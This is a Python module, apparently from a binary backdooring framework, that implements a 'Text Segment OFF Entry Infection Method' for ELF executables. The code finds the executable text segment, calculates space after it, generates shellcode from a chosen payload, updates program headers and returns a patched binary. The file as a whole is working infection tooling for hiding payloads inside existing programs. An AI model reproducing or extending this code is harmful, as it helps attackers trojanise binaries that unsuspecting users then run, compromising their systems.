import os
import logging
from core import enum
from core import support
import io
import struct
#from elf.core import intelCore
#from elf.core import core
logger = logging.getLogger(__name__)


class text_off_entry:

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = """text_off_entry"""
        self.description = """Text Segment OFF Entry Infection Method"""
        self.requirements = {'FILE':'Binary to be patched',
                             'MODE':'How the patching will happen',
                             'PAYLOAD':'Payload to be patched into binary',
                            }

    def support_checks(self):
        support_chk = support.support(self)
        #pre-process here
        if not support_chk.check_reqs():
            return False

        if not support_chk.check_modes():
            return False

        if not support_chk.check_payloads():
            return False

        if not support_chk.check_core():
            return False

        if not support_chk.check_modifier():
            return False

        return True

    def patch(self, BDF):
        # self.BDF is passed to inherited classes, add class objects if you want them passed to other classes
        self.BDF = BDF
        self.BDF.core_support = 'text_split_core'
        self.BDF.elf_object['distance_to_payload'] = 0
        if not self.support_checks():
            return False

        logger.info("[*] Selected Payload: {0}".format(self.found_payload.__class__.__name__))

        logger.info("[*] Selected Mode: {0}".format(self.found_mode.__class__.__name__))

        self.BDF.elf_object['loaded_binary'].seek(24, 0)

        self.BDF.headerTracker = 0x0
        self.BDF.PAGE_SIZE = 4096
        self.BDF.newOffset = None
        #find range of the first PT_LOAD section
        for header, values in self.BDF.elf_object['prog_hdr'].items():
            #print 'program header', header, values
            if values['p_flags'] == 0x5 and values['p_type'] == 0x1:
                #print "Found text segment"
                self.BDF.shellcode_vaddr = values['p_vaddr'] + values['p_filesz']
                beginOfSegment = values['p_vaddr']
                oldentry = self.BDF.elf_object['e_entry']
                #sizeOfNewSegment = values['p_memsz'] + self.BDF.newBuffer
                #LOCofNewSegment = values['p_filesz'] + self.BDF.newBuffer
                self.BDF.headerTracker = header
                self.BDF.newOffset = values['p_offset'] + values['p_filesz']

        # print(f"Shellcode location: {self.BDF.newOffset}")
        # print(f"distance from payload: {self.BDF.newOffset - self.BDF.elf_object['e_entry']}")

        self.BDF.elf_object['distance_to_payload'] = self.BDF.newOffset - self.BDF.elf_object['e_entry']

        self.BDF.elf_object['loaded_binary'].seek(0)

        self.BDF.found_payload = self.found_payload

        self.BDF.elf_object['shellcode'] = self.BDF.found_payload.invoke(self)

        if self.BDF.elf_object['shellcode'] is False:
            return False

        self.BDF.elf_object['shellcode_length'] = len(self.BDF.elf_object['shellcode'])

        logger.debug(f"self.BDF.elf_object['shellcode_length'] {self.BDF.elf_object['shellcode_length']}")
        logger.debug(f"found_mode: {self.found_mode}")

        # No need to call the payload twice (as before)
        # Modes are unique to binary patching method
        self.found_mode.BDF = self.BDF
        found_mode_result = self.found_mode.invoke_mode()

        if not found_mode_result:
            return False

        logger.debug(f"self.found_core:  {self.found_core} - {type(self.found_core)}")

        # Found Core is an artifact from the support call
        # 'Cores are unique to the chipset and OS'
        self.found_core
        self.found_core.BDF = self.BDF
        logger.debug(self.found_core)

        self.found_core.update_header()

        self.patched_binary = io.BytesIO(self.BDF.original_binary.read(-1))
         # do patch_instr here
        patch = support.support(self)
        patch.patch_file()

        result = self.patched_binary

        # DELETE THIS
        #self.patched_binary = io.BytesIO(self.BDF.elf_object['loaded_binary'].read(-1))
        #result = self.patched_binary

        result.seek(0)

        return result
